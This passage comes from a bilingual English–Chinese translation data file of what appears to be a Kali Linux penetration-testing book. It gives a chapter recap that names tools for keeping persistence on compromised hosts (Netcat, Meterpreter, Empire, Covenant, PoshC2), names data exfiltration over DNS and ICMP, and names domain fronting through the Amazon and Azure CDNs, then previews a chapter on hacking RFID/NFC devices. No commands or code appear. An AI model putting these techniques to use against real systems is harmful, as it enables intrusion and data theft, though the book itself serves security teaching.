  zh: 我们研究了如何使用 Netcat、Meterpreter、计划任务、PowerShell Empire 的 dbx 和 onedrive 模块、Covenant
    C2 和 Poshc2 植入物在被攻陷的系统上保持持久代理，以及如何通过传统服务（如 DNS、ICMP、Telnet、RDP 和 Netcat）来提取数据。我们还学会了如何找到易受攻击的域名前置域，并利用像
    Amazon 和 Azure 这样的知名 CDN 来进行恶意活动。
- en: In the next chapter, we will look at how to hack embedded and RFID/NFC devices
    using both existing Kali 2021.4 features and additional tools.
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将探讨如何利用现有的 Kali 2021.4 特性以及额外的工具来破解嵌入式设备和 RFID/NFC 设备。
